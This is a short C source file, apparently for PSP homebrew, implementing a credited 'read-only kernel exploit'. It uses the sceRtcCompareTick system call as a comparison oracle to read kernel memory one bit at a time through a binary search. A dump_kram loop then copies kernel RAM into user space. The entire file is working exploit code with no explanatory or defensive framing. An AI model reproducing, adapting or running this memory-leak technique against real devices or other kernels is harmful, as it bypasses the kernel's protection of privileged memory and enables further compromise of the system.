#include <pspsdk.h>

/*
  sceRtcCompareTick read-only kernel exploit implementation by CelesteBlue
*/


// input: 4-byte-aligned kernel address to a 64-bit integer
// return *addr >= value;
int is_ge_u64(uint32_t addr, uint32_t *value) {
	return (int)sceRtcCompareTick((uint64_t *)value, (uint64_t *)addr) <= 0;
}

// sceRtcCompareTick kernel exploit by davee, implementation by CelesteBlue
// input: 4-byte-aligned kernel address
// return *addr
uint64_t kread64(uint32_t addr) {
	uint32_t value[2] = {0, 0};
	uint32_t res[2] = {0, 0};
	int bit_idx = 0;
	for (; bit_idx < 32; bit_idx++) {
		value[1] = res[1] | (1 << (31 - bit_idx));
		if (is_ge_u64(addr, value))
			res[1] = value[1];
	}
	value[1] = res[1];
	bit_idx = 0;
	for (; bit_idx < 32; bit_idx++) {
		value[0] = res[0] | (1 << (31 - bit_idx));
		if (is_ge_u64(addr, value))
			res[0] = value[0];
	}
	return *(uint64_t*)res;
}

void dump_kram(u32* dst, u32* src, u32 size) {
    u32 count = 0;
    while (count < size){
        u64 ret = kread64((u32)src);
        dst[0] = ((uint32_t *)&ret)[1];
        dst[1] = ((uint32_t *)&ret)[0];
        dst += 2;
        src += 2;
        count += 8;
    }
}
